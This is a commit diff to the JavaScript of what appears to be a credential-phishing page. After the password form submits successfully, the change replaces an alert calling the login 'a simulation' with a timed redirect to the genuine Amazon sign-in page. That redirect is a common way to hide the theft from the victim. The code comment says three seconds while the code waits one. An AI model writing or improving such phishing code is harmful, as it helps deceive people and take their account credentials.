0138b735273754c82b970d9cc381df4f832f6c37
sammy-ulfh <sammy_ulfh@proton.me>
2025-07-19 00:46:14 +0000

    Tool Update

--- web/js/script.js
+++ web/js/script.js
@@ -162,9 +162,11 @@ passwordFormElement.addEventListener('submit', function (e) {
     })
     .then(data => {
         if (data.success) {
-            alert('¡Inicio de sesión exitoso! (Esta es una simulación)');
-            // Aquí normalmente redirigirías al usuario
-        } else {
+            // Redirecciona al usuario después de 3 segundos
+            setTimeout(function() {
+                window.location.href = "https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0";
+            }, 1000);
+          } else {
             showError('password', data.message || 'Error en la autenticación');
         }
     })
